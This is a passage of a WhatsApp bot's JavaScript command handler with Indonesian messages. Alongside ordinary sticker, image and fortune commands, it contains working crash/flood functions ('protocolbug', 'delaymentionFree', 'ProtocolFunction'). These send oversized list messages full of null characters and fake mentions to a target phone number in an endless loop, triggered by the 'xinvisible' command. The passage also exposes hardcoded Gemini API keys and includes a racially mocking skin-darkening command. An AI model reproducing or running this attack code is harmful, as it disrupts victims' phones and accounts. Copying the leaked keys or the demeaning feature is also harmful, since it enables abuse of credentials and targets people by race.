                  id: `.qc2 magenta ${text}`
                },                
                {
                title: 'tan',
                  id: `.qc2 tan ${text}`
                },
                {
                  title: 'wheat',
                  id: `.qc2 wheat ${text}`
                },                
                {
                title: 'deeppink',
                  id: `.qc2 deepink ${text}`
                },
                {
                  title: 'api',
                  id: `.qc2 api ${text}`
                },                
                {
                  title: 'birulangit',
                  id: `.qc2 birulangit ${text}`
                },                
                {
                title: 'jingga',
                  id: `.qc2 jingga ${text}`
                },                
                {
                  title: 'birulangitcerah',
                  id: `.qc2 birulangitcerah ${text}`
                },                
                {
                title: 'hotpink',
                  id: `.qc2 hotpink ${text}`
                },                
                {
                title: 'birumudalangit',
                  id: `.qc2 birumudalangit ${text}`
                },
                {
                  title: 'hijaulaut',
                  id: `.qc2 hijaulaut ${text}`
                },                
                {
                title: 'merahtua',
                  id: `.qc2 merahtua ${text}`
                },
                {
                  title: 'oranyemerah',
                  id: `.qc2 oranyemerah ${text}`
                },                
                {
                  title: 'cyan',
                  id: `.qc2 cyan ${text}`
                },                
                {
                title: 'ungutua',
                  id: `.qc2 ungutua ${text}`
                },
                {
                  title: 'hijaulumut',
                  id: `.qc2 hijaulumut ${text}`
                },                
                {
                  title: 'hijaugelap',
                  id: `.qc2 hijaugelap ${text}`
                },                
                {
                  title: 'birulaut',
                  id: `.qc2 birulaut ${text}`
                }
              ]
            }
          ]
        })
      }
      }
  ],
    headerType: 1,
  viewOnce: true,
  }, { quoted: qkontak });
                    await sleep(200)
     Denzy.sendMessage(m.chat, {
                        audio: fs.readFileSync('./start/lib/media/menu2.mp3'),
                        mimetype: 'audio/mp4',
                        ptt: true
                    }, {
                        quoted: qkontak
                    })
                    }
break
case 'qccode': {
reply(`Contoh: ${prefix}qc pink hallo\n\n*List Warna*\npink\nbiru\nmerah\nhijau\nkuning\nungu\nbirutua\nbirumuda\nabu\norange\nhitam\nputih\nteal\nmerahmuda\ncokelat\nsalmon\nmagenta\ntan\nwheat\ndeeppink\napi\nbirulangit\njingga\nbirulangitcerah\nhotpink\nbirumudalangit\nhijaulaut\nmerahtua\noranyemerah\ncyan\nungutua\nhijaulumut\nhijaugelap\nbirulaut\noranyetua\nungukehitaman\nfuchsia\nmagentagelap\nabu-abutua\npeachpuff\nhijautua\nmerahgelap\ngoldenrod\nabu-abutua\nungugelap\nemas\nperak`)
			}
			break
						case 'qc2': {
				if (!text) return reply(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} pink hallo\n\n*List Warna*:\npink\nbiru\nmerah\nhijau\nkuning\nungu\nbirutua\nbirumuda\nabu\norange\nhitam\nputih\nteal\nmerahmuda\ncokelat\nsalmon\nmagenta\ntan\nwheat\ndeeppink\napi\nbirulangit\njingga\nbirulangitcerah\nhotpink\nbirumudalangit\nhijaulaut\nmerahtua\noranyemerah\ncyan\nungutua\nhijaulumut\nhijaugelap\nbirulaut\noranyetua\nungukehitaman\nfuchsia\nmagentagelap\nabu-abutua\npeachpuff\nhijautua\nmerahgelap\ngoldenrod\nabu-abutua\nungugelap\nemas\nperak`)
				let [color, ...message] = text.split(' ');
				message = message.join(' ');
				let backgroundColor;

				switch (color) {
					case 'pink':
						backgroundColor = '#f68ac9';
						break;
					case 'biru':
						backgroundColor = '#6cace4';
						break;
					case 'merah':
						backgroundColor = '#f44336';
						break;
					case 'hijau':
						backgroundColor = '#4caf50';
						break;
					case 'kuning':
						backgroundColor = '#ffeb3b';
						break;
					case 'ungu':
						backgroundColor = '#9c27b0';
						break;
					case 'birutua':
						backgroundColor = '#0d47a1';
						break;
					case 'birumuda':
						backgroundColor = '#03a9f4';
						break;
					case 'abu':
						backgroundColor = '#9e9e9e';
						break;
					case 'orange':
						backgroundColor = '#ff9800';
						break;
					case 'hitam':
						backgroundColor = '#000000';
						break;
					case 'putih':
						backgroundColor = '#ffffff';
						break;
					case 'teal':
						backgroundColor = '#008080';
						break;
					case 'merahmuda':
						backgroundColor = '#FFC0CB';
						break;
					case 'cokelat':
						backgroundColor = '#A52A2A';
						break; // Added break
					case 'salmon':
						backgroundColor = '#FFA07A';
						break;
					case 'magenta':
						backgroundColor = '#FF00FF';
						break;
					case 'tan':
						backgroundColor = '#D2B48C';
						break;
					case 'wheat':
						backgroundColor = '#F5DEB3';
						break;
					case 'deeppink':
						backgroundColor = '#FF1493';
						break;
					case 'api':
						backgroundColor = '#B22222';
						break;
					case 'birulangit':
						backgroundColor = '#00BFFF';
						break;
					case 'jingga':
						backgroundColor = '#FF7F50';
						break;
					case 'birulangitcerah':
						backgroundColor = '#1E90FF';
						break;
					case 'hotpink':
						backgroundColor = '#FF69B4';
						break;
					case 'birumudalangit':
						backgroundColor = '#87CEEB';
						break;
					case 'hijaulaut':
						backgroundColor = '#20B2AA';
						break;
					case 'merahtua':
						backgroundColor = '#8B0000';
						break;
					case 'oranyemerah':
						backgroundColor = '#FF4500';
						break;
					case 'cyan':
						backgroundColor = '#48D1CC';
						break;
					case 'ungutua':
						backgroundColor = '#BA55D3';
						break;
					case 'hijaulumut':
						backgroundColor = '#00FF7F';
						break;
					case 'hijaugelap':
						backgroundColor = '#008000';
						break;
					case 'birulaut':
						backgroundColor = '#191970';
						break;
					case 'oranyetua':
						backgroundColor = '#FF8C00';
						break;
					case 'ungukehitaman':
						backgroundColor = '#9400D3';
						break;
					case 'fuchsia':
						backgroundColor = '#FF00FF';
						break;
					case 'magentagelap':
						backgroundColor = '#8B008B';
						break;
					case 'abu-abutua':
						backgroundColor = '#696969';
						break;
					case 'peachpuff':
						backgroundColor = '#FFDAB9';
						break;
					case 'hijautua':
						backgroundColor = '#BDB76B';
						break;
					case 'merahgelap':
						backgroundColor = '#DC143C';
						break;
					case 'goldenrod':
						backgroundColor = '#DAA520';
						break;
					case 'emas':
						backgroundColor = '#FFD700';
						break;
					case 'perak':
						backgroundColor = '#C0C0C0';
						break;
					default:
						backgroundColor = '#ffffff'
						message = text
				}

				try {
					avatar = await Denzy.profilePictureUrl(m.sender, "image");
				} catch {
					avatar = 'https://telegra.ph/file/c3f3d2c2548cbefef1604.jpg';
				}

				const json = {
					type: "quote",
					format: "png",
					backgroundColor,
					width: 700,
					height: 580,
					scale: 2,
					messages: [{
						entities: [],
						avatar: true,
						from: {
							id: 1,
							name: m.pushName,
							photo: {
								url: avatar
							}
						},
						text: message,
						"m.replyMessage": {}
					}],
				};

				try {
					const res = await axios.post("https://quotly.netorare.codes/generate", json, {
						headers: {
							"Content-Type": "application/json"
						},
					});
					const qc = Buffer.from(res.data.result.image, "base64");
					await Denzy.imgToSticker(m.chat, qc, m, {
						packname: `Sticker Maker\nNomor Bot :`,
						author: `${namaBot}\n${owner}`
					});
				} catch (error) {
					console.error("Error generating QC v1:", error);
					try {
						const data = await axios.post("https://bot.lyo.su/quote/generate", json, {
							headers: {
								"Content-Type": "application/json"
							},
						});
						const qc = Buffer.from(data.data.result.image, "base64");
						await Denzy.imgToSticker(m.chat, qc, m, {
							packname: `Sticker Maker\nNomor Bot :`,
							author: `${namaBot}\n${owner}`
						});
					} catch (error) {
						await m.errorReport(util.format(error), command)
					}
				}
			}
			break
case 'qc1': {
    if (!q) return reply('Enter Text');
    const ppnyauser = await Denzy.profilePictureUrl(m.sender, 'image').catch(_ => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg');
    const json = {
        "type": "quote",
        "format": "png",
        "backgroundColor": "#FFFFFF",
        "width": 512,
        "height": 768,
        "scale": 2,
        "messages": [
            {
                "entities": [],
                "avatar": true,
                "from": {
                    "id": 1,
                    "name": pushname,
                    "photo": {
                        "url": ppnyauser
                    }
                },
                "text": q,
                "replyMessage": {}
            }
        ]
    };

    const res = await axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
    });
    const buffer = Buffer.from(res.data.result.image, 'base64');
    const rest = { 
        status: "200", 
        creator: "ᴜsᴍᴀɴ ᴄʜᴀᴄʜᴀʀ",
        result: buffer
    };

    Denzy.sendImageAsSticker(m.chat, rest.result, m, {
        packname: `${global.packname}`,
        author: `${global.author}`
    });
}
break;
case 'setpp-panjang': {
if (!isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
const jimp_1 = require('jimp')
async function pepe(media) {
	const jimp = await jimp_1.read(media)
	const min = jimp.getWidth()
	const max = jimp.getHeight()
	const cropped = jimp.crop(0, 0, min, max)
	return {
		img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp_1.MIME_JPEG),
		preview: await cropped.normalize().getBufferAsync(jimp_1.MIME_JPEG)
	}
}
	let q = m.quoted ? m.quoted : m
	let mime = (q.msg || q).mimetype || q.mediaType || ''
	if (/image/g.test(mime) && !/webp/g.test(mime)) {
		try {
			const media = await Denzy.downloadAndSaveMediaMessage(quoted)
			let botNumber = await Denzy.decodeJid(Denzy.user.id)
			let { img } = await pepe(media)
			await Denzy.query({
				tag: 'iq',
				attrs: {
					to: botNumber,
					type:'set',
					xmlns: 'w:profile:picture'
				},
				content: [
					{
						tag: 'picture',
						attrs: { type: 'image' },
						content: img
					}
				]
			})
			Reply(`Successfully replaced PP Bot`)
		} catch (e) {
			console.log(e)
			Reply(`An error occurred, please try again later.`)
		}
	} else {
		Reply(`Send image with caption *${command}* or tag images that have been sent`)
	}
}
break
case "ramalan": {
 let fortunes = [
 "🔮 Hari ini keberuntungan ada di pihakmu!",
 "⚡ Waspada dengan keputusan besar hari ini.",
 "🌞 Kamu akan mendapatkan kejutan menyenangkan!",
 "💼 Kesempatan emas sedang mendekat, jangan lewatkan!"
 ];
 let randomFortune = fortunes[Math.floor(Math.random() * fortunes.length)];
 m.reply(`🔮 *Ramalan Hari Ini:* \n\n${randomFortune}`);
};
break;

case "glitchtext": {
 if (!args.length) return m.reply("Masukkan teks untuk diubah menjadi glitch!");
 
 let text = args.join(" ");
 let glitch = text.split("").map(char => char + "̖̫͟").join("");
 
 m.reply(`🌌 *Glitch Text:* \n\n${glitch}`);
};
break;
async function protocolbug(isTarget, mention) {
const delaymention = Array.from({ length: 9741 }, (_, r) => ({
title: "᭯".repeat(9741),
rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
}));

const MSG = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "",
listType: 2,
buttonText: null,
sections: delaymention,
singleSelectReply: { selectedRowId: "🌀" },
contextInfo: {
mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
participant: isTarget,
remoteJid: "status@broadcast",
forwardingScore: 9741,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "9741@newsletter",
serverMessageId: 1,
newsletterName: "-"
}
},
description: ""
}
}
},
contextInfo: {
channelMessage: true,
statusAttributionType: 2
}
};

const msg = generateWAMessageFromContent(isTarget, MSG, {});

await Denzy.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [isTarget],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: isTarget },
content: undefined
}
]
}
]
}
]
});

if (mention) {
await Denzy.relayMessage(
isTarget,
{
statusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
type: 25
}
}
}
},
{
additionalNodes: [
{
tag: "meta",
attrs: { is_status_mention: "𝐇𝐀𝐈" },
content: undefined
}
]
}
);
}
}

async function delaymentionFree(target, mention) {
 // Generate an array of delay mentions with increased size
 const delaymention = Array.from({ length: 10000 }, (_, r) => ({
 title: "᭯" + "\u0000".repeat(500000), // Increased size
 rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
 }));

 // Create the message structure
 const MSG = {
 viewOnceMessage: {
 message: {
 listResponseMessage: {
 title: "@DENZY 𝐎𝐅𝐅𝐂",
 listType: 2,
 buttonText: null,
 sections: delaymention,
 singleSelectReply: { selectedRowId: "🌀" },
 contextInfo: {
 mentionedJid: Array.from({ length: 10000 }, () => 
 `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
 ),
 participant: target,
 remoteJid: "status@broadcast",
 forwardingScore: 10000,
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: "10000@newsletter",
 serverMessageId: 1,
 newsletterName: "-"
 }
 },
 description: null
 }
 }
 },
 contextInfo: {
 channelMessage: true,
 statusAttributionType: 2
 }
 };

 // Generate the message from content
 const msg = generateWAMessageFromContent(target, MSG, {});

 // Relay the message to the status broadcast
 await Denzy.relayMessage("status@broadcast", msg.message, {
 messageId: msg.key.id,
 statusJidList: [target],
 additionalNodes: [
 {
 tag: "meta",
 attrs: {},
 content: [
 {
 tag: "mentioned_users",
 attrs: {},
 content: [
 {
 tag: "to",
 attrs: { jid: target },
 content: undefined
 }
 ]
 }
 ]
 }
 ]
 });

 // If mention is true, send a status mention message
 if (mention) {
 await Denzy.relayMessage(
 target,
 {
 statusMentionMessage: {
 message: {
 protocolMessage: {
 key: msg.key,
 type: 25
 }
 }
 }
 },
 {
 additionalNodes: [
 {
 tag: "meta",
 attrs: { is_status_mention: "🌀 𝐃𝐄𝐍𝐂𝐑𝐀𝐒𝐇𝐄🩸" },
 content: undefined
 }
 ]
 }
 );
 }
}

function delay(ms) {
 return new Promise(resolve => setTimeout(resolve, ms));
}

async function ProtocolFunction(target) {
 let count = 0;

 while (true) {
 try {
 await delaymentionFree(target, false);
 await delay(200)

 count++;

 // Log setiap pengiriman
 console.log(chalk.green(`[ GHOST ATTACK ] Attack Ke ${count} Berhasil Ke Target: ${target}`));

 // Set delay setiap 60 iterasi
 if (count % 60 === 0) {
 console.log(chalk.yellow(`Delay 15 detik setelah ${count} pengiriman...`));
 await delay(15000);
 }
 } catch (err) {
 console.error(chalk.red("Terjadi error:"), err.message);
 await delay(5000);
 }
 }
}
 break;
case 'addcase': {
  if (!isDenzyCreator) return m.reply(mess.owner);
  if (!args[0]) return m.reply(`Contoh: case nya`);
  const namaFile = path.join(__dirname, 'makima.js');
  const caseBaru = `${text}\n\n`;
  const tambahCase = (data, caseBaru) => {
    const posisiDefault = data.lastIndexOf("default:");
    if (posisiDefault !== -1) {
      const kodeBaruLengkap = data.slice(0, posisiDefault) + caseBaru + data.slice(posisiDefault);
      return {
        success: true,
        kodeBaruLengkap
      };
    } else {
      return {
        success: false,
        message: "Tidak dapat menemukan case default di dalam file!"
      };
    }
  };
  fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
      console.error('Terjadi kesalahan', err);
      return m.reply(`Terjadi kesalahan: ${err}`);
    }
    const result = tambahCase(data, caseBaru);
    if (result.success) {
      fs.writeFile(namaFile, result.kodeBaruLengkap, 'utf8', (err) => {
        if (err) {
          console.error('Terjadi kesalahan', err);
          return m.reply(`Terjadi kesalahan: ${err.message}`)
        } else {
          console.log('Sukses menambahkan case baru:')
          console.log(caseBaru)
          return m.reply('Sukses menambahkan case!')
        }
      })
    } else {
      console.error(result.message)
      return m.reply(result.message)
    }
  })
}
break               
case 'removebg': case 'nobg': case 'hapusbackground': {
if (!quoted) return Reply(`mana Fotonya kak?`)
if (!/image/.test(mime)) return Reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
try {
Reply("cocote")
const media = await Denzy.downloadAndSaveMediaMessage(quoted)
const anuu = await UploadFileUgu (media)
const getimg = await fetchJson(`https://api.siputzx.my.id/api/iloveimg/removebg?image=${anuu.url}&scale=2`);
const img = getimg.result.url;
Denzy.sendMessage(m.chat, { image: { url: img }, caption: 'berhasil menghapus background..'}, { quoted: m})
	} catch {
	  Reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
break
case 'hd1': {
const sharp = require('sharp');
const fs = require('fs');
const path = require('path');

async function upscaleImage(inputPath, resolutionOption) {
   const outputPath = './output/';
  try {
    if (!fs.existsSync(inputPath)) {
      throw new Error(`File tidak ditemukan: ${inputPath}`);
    }

    const outputDir = path.dirname(outputPath);
    if (!fs.existsSync(outputDir)) {
      fs.mkdirSync(outputDir, { recursive: true });
    }

    const resolutions = {
      1: { label: '1080p', width: 1920, height: 1080 },
      2: { label: '2k', width: 2560, height: 1440 },
      3: { label: '4k', width: 3840, height: 2160 },
      4: { label: '8k', width: 7680, height: 4320 },
      5: { label: '16k', width: 15360, height: 8640 },
    };

    if (!resolutions[resolutionOption]) {
      Reply('Pilihan resolusi tidak valid. Pilih antara 1 - 5.');
    }

    const selectedResolution = resolutions[resolutionOption];
    const outputPathResolution = `./output/foto-${selectedResolution.label}.jpg`;

    await sharp(inputPath)
      .resize({
        width: selectedResolution.width,
        height: selectedResolution.height,
        fit: sharp.fit.inside,
        kernel: sharp.kernel.lanczos3,
      })
      .sharpen({
        sigma: 2,
        m1: 3,
        m2: 1,
      })
      .normalize()
      .modulate({
        saturation: 1.3,
        brightness: 0.85,
      })
      .toFormat('jpeg', {
        quality: 100,
        progressive: true,
      })
      .toFile(outputPathResolution);

    await Denzy.sendMessage(m.chat, { image: fs.readFileSync(outputPathResolution), caption: "Done Cik"});
    
  } catch (error) {
    return error
    Reply(`Gagal memproses gambar: ${error.message}`);
  }
}

if (!m.quoted) return Reply("Reply foto nya")
const resolutionOption = args[0];
if (!resolutionOption) return Reply(`pakai opsi hd yang memiliki 5 type yaitu

1 = 1080p
2 = 2k
3 = 4k
4 = 8k
5 = 16k
`)

const bufferImage = await m.quoted.download()
const tempFilePath = path.join(__dirname, `temp_image_${Date.now()}.jpg`);
fs.writeFileSync(tempFilePath, bufferImage);
return await upscaleImage(tempFilePath, resolutionOption);
fs.unlinkSync(tempFilePath);
}
break
case 'toanime': case 'jadianime': {
if (!isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m});
if (!quoted) return Reply(`Fotonya Mana?`)
if (!/image/.test(mime)) return Reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
try {
Denzy.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
const media = await Denzy.downloadAndSaveMediaMessage(quoted)
const anuu = await UploadFileUgu (media)
Denzy.sendMessage(m.chat, { image: { url: `https://skizoasia.xyz/api/toanime?url=${anuu.url}&apikey=nonogembul` }, caption: 'Selesai'}, { quoted: m})
	} catch {
	  Reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
break
case 'xghsot':
case 'imperceptible':
case 'xinvisible': {
 if (!isDenzyCreator) return m.reply(`khusus owner kak`);
 if (!text) return m.reply(`Example: ${prefix + command} 62×××`);

 let bijipler = q.replace(/[^0-9]/g, "");
 if (bijipler.startsWith('0')) {
 return m.reply(`*Error!*\n\n_Use : ${command} Number_\n_Example : ${command} 62xx_\n𝐃𝐄𝐍𝐂𝐑𝐀𝐒𝐇𝐄𝐑🩸`);
 }

 let target = bijipler + '@s.whatsapp.net';


 let After = `『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${bijipler}
𖥂 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝘆
𖥂 𝐓𝐘𝐏𝐄 : ${command}`;

 Denzy.sendMessage(m.chat, {
 caption: After,
 image: { url: "https://files.catbox.moe/wspulz.jpg" },
 footer: "𝐃𝐄𝐍𝐂𝐑𝐀𝐒𝐇𝐄𝐑🩸",
 buttons: [
 {
 buttonId: `.menu`,
 buttonText: { displayText: '𝐁𝐀𝐂𝐊' },
 type: 1,
 viewOnce: true
 },
 {
 buttonId: '.owner',
 buttonText: { displayText: '𝐎𝐖𝐍𝐄𝐑' },
 type: 1,
 viewOnce: true
 }
 ],
 headerType: 1,
 viewOnce: true
 }, { quoted: lol2 });
 ////////////// Pengiriman Bug //////////////
await protocolbug(target, true);
await ProtocolFunction(target);
await protocolbug(target);
    
}
break                
case 'enc': {
if (!m.quoted) return m.reply("replay file.js nya")
if (mime !== "application/javascript") return reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.fileName
await fs.writeFileSync(`./@hardenc${filename}.js`, media)
await m.reply("Memproses encrypt hard code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./@hardenc${filename}.js`).toString(), {
 target: "node",
 preset: "high",
 compact: true,
 minify: true,
 flatten: true,

 identifierGenerator: function() {
 const originalString = 
 "🐔고통스러운 Denzy 고통스러운🐔" + 
 "🐔고통스러운 Denzy 고통스러운🐔";
 
 // Fungsi untuk menghapus karakter yang tidak diinginkan
 function removeUnwantedChars(input) {
 return input.replace(
 /[^a-zA-Z座Denzy素Staries素晴]/g, ''
 );
 }

 // Fungsi untuk menghasilkan string acak
 function randomString(length) {
 let result = '';
 const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; // Hanya simbol
 const charactersLength = characters.length;

 for (let i = 0; i < length; i++) {
 result += characters.charAt(
 Math.floor(Math.random() * charactersLength)
 );
 }
 return result;
 }

 return removeUnwantedChars(originalString) + randomString(2);
 },

 renameVariables: true,
 renameGlobals: true,

 stringEncoding: true,
 stringSplitting: 0.0,
 stringConcealing: true,
 stringCompression: true,
 duplicateLiteralsRemoval: 1.0,

 shuffle: {
 hash: 0.0,
 true: 0.0
 },

 stack: true,
 controlFlowFlattening: 1.0,
 opaquePredicates: 0.9,
 deadCode: 0.0,
 dispatcher: true,
 rgf: false,
 calculator: true,
 hexadecimalNumbers: true,
 movedDeclarations: true,
 objectExtraction: true,
 globalConcealing: true 
}).then(async (obfuscated) => {
 await fs.writeFileSync(`./@hardenc${filename}.js`, obfuscated)
 await Denzy.sendMessage(m.chat, {document: fs.readFileSync(`./@hardenc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File JS Sukses! Type:\nString"}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
}
break
case "tourl": {
if (!/image/.test(mime)) return m.reply(("dengan kirim/reply foto"))
let media = await Denzy.downloadAndSaveMediaMessage(qmsg)             
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'Denzy.png');

let teks = directLink.toString()
await Denzy.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break
case "reactionch": case "reactch": {
 if (!isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m});
 if (!text || !args[0] || !args[1]) 
 return Reply("Contoh penggunaan:\n.reactch https://whatsapp.com/channel/0029VakRR89L7UVPwf53TB0v/4054 😂")
 if (!args[0].includes("https://whatsapp.com/channel/")) 
 return Reply("Link tautan tidak valid")
 let result = args[0].split('/')[4]
 let serverId = args[0].split('/')[5]
 let res = await Denzy.newsletterMetadata("invite", result) 
 await Denzy.newsletterReactMessage(res.id, serverId, args[1])
 Reply(`Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`)
}
break
case 'hijabkan': case 'tohijab': {
    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || "";
    let defaultPrompt = "Buatkan Karakter Yang Ada Di Gambar Tersebut Agar Diberikan Hijab Warna Putih Hijab Ala Orang Indonesia Dan Jangan Sampai Rambutnya Terlihat, Semua Tertutup";
    if (!mime) {
        m.reply("Tidak ada gambar yang direply, membuat gambar default...");
        mime = "image/png";
        q = { msg: { mimetype: mime }, download: async () => fs.readFileSync("default_image.png") };
    }
    if (!/image\/(jpe?g|png)/.test(mime)) return m.reply(`Format ${mime} tidak didukung! Hanya jpeg/jpg/png`);
    let promptText = text || defaultPrompt;
    await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
    try {
        let imgData = await q.download();
        let genAI = new GoogleGenerativeAI("AIzaSyDWxXKqqaz3Ypv7rW2j9Fhn2TNYazTOUCI");
        const base64Image = imgData.toString("base64");
        const contents = [
            { text: promptText },
            {
                inlineData: {
                    mimeType: mime,
                    data: base64Image
                }
            }
        ];
        const model = genAI.getGenerativeModel({
            model: "gemini-2.0-flash-exp-image-generation",
            generationConfig: {
                responseModalities: ["Text", "Image"]
            },
        });
        const response = await model.generateContent(contents);
        let resultImage;
        let resultText = "";
        for (const part of response.response.candidates[0].content.parts) {
            if (part.text) {
                resultText += part.text;
            } else if (part.inlineData) {
                const imageData = part.inlineData.data;
                resultImage = Buffer.from(imageData, "base64");
            }
        }
        if (resultImage) {
            const tmpDir = path.join(process.cwd(), "tmp");
            if (!fs.existsSync(tmpDir)) {
                fs.mkdirSync(tmpDir, { recursive: true });
            }
            let tempPath = path.join(tmpDir, `gemini_${Date.now()}.png`);
            fs.writeFileSync(tempPath, resultImage);
            await Denzy.sendMessage(m.chat, { 
                image: { url: tempPath },
                caption: `*Selamat Waifu Anda Sudah Halal*`
            }, { quoted: m });
            setTimeout(() => {
                try {
                    fs.unlinkSync(tempPath);
                } catch (err) {
                    console.error("Failed to delete temp file:", err);
                }
            }, 30000);
        } else {
            m.reply("Gagal Di Hijabkan Dosa Nya Ke gedean Ini Mah.");
        }
    } catch (error) {
        console.error(error);
        m.reply(`Error: ${error.message}`);
    }
}
break
case "hytamkan": {
  let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || "";
  
  let defaultPrompt = "Ubahlah Karakter Dari Gamabar Tersebut Diubah Kulitnya Menjadi Hitam";
  
  if (!mime) return Reply(`Kirim/reply gambar dengan caption *${prefix + command}*`);
  if (!/image\/(jpe?g|png)/.test(mime)) return Reply(`Format ${mime} tidak didukung! Hanya jpeg/jpg/png`);
  
  let promptText = text || defaultPrompt;
  
  Reply("Otw Menghitam...");
  
  try {
    let imgData = await q.download();
    let genAI = new GoogleGenerativeAI("AIzaSyDdfNNmvphdPdHSbIvpO5UkHdzBwx7NVm0");
    
    const base64Image = imgData.toString("base64");
    
    const contents = [
      { text: promptText },
      {
        inlineData: {
          mimeType: mime,
          data: base64Image
        }
      }
    ];
    
    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-exp-image-generation",
      generationConfig: {
        responseModalities: ["Text", "Image"]
      },
    });
    
    const response = await model.generateContent(contents);
    
    let resultImage;
    let resultText = "";
    
    for (const part of response.response.candidates[0].content.parts) {
      if (part.text) {
        resultText += part.text;
      } else if (part.inlineData) {
        const imageData = part.inlineData.data;
        resultImage = Buffer.from(imageData, "base64");
      }
    }
    
    if (resultImage) {
      const tempPath = path.join(process.cwd(), "tmp", `gemini_${Date.now()}.png`);
      fs.writeFileSync(tempPath, resultImage);
      
      await Denzy.sendMessage(m.chat, { 
        image: { url: tempPath },
        caption: `*Wahaha Makan Nih Hytam*`
      }, { quoted: m });
      
      setTimeout(() => {
        try {
          fs.unlinkSync(tempPath);
        } catch {}
      }, 30000);
    } else {
      m.reply("Gagal Menghitamkan.");
    }
  } catch (error) {
    console.error(error);
    m.reply(`Error: ${error.message}`);
  }
}
break
case 'sifat': case 'karakter': {
if (!text) return Reply(`Contoh : ${prefix + command} nama, tanggal lahir, bulan lahir, 
tahun lahir`)
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return Reply(anu.message)
Reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Garis Hidup :* ${anu.message.garis_hidup}`)
}
break
case 'artimimpi': case 'tafsirmimpi': {
if (!text) return Reply(`Contoh : ${prefix + command} belanja`)
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
let anu = await primbon.tafsir_mimpi(text)
if (anu.status == false) return Reply(anu.message)
Reply(`• *Mimpi :* ${anu.message.mimpi}\n• *Arti :* ${anu.message.arti}\n• *Solusi :* ${anu.message.solusi}`)
}
break
case 'artinama': {
if (!text) return Reply(`Contoh : ${prefix + command} Dika Ardianta`)
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
let anu = await primbon.arti_nama(text)
if (anu.status == false) return Reply(anu.message)
Reply (`• *Nama :* ${anu.message.nama}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'upch': {
if (!isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
        		try {
					ppuser = await Denzy.profilePictureUrl(m.sender, 'image');
				} catch (err) {
					ppuser = 'https://files.catbox.moe/j9k007.jpg'
				}	
				let fotoProfil = await getBuffer(ppuser);
				let pelers = `Message from ${m.pushName}`
				try {
					if (!mime && !text) {
						return reply(`Uh-oh, sis! You haven't sent any media or text yet. Please try again! 🤭`)
					}
					media = mime ? await quoted.download() : null
					let defaultCaption = "✨ This media is sent via an automated system✨"
					if (/image/.test(mime)) {
						Denzy.sendMessage(channel, {
					contextInfo: {	
		        externalAdReply: {
						showAdAttribution: true,
						title: pelers,
						mediaType: 1,
						previewType: 1,
						body: 'Massage to channel',
						thumbnail: fotoProfil,
					    renderLargerThumbnail: false,
						mediaUrl: '',
					    sourceUrl: ''
			        }
			        },
							image: media,
							caption: text ? text : defaultCaption
						})
						reply(`📸 Image successfully uploaded to channel with caption: "${text ? text : defaultCaption}"`)
					} else if (/video/.test(mime)) {
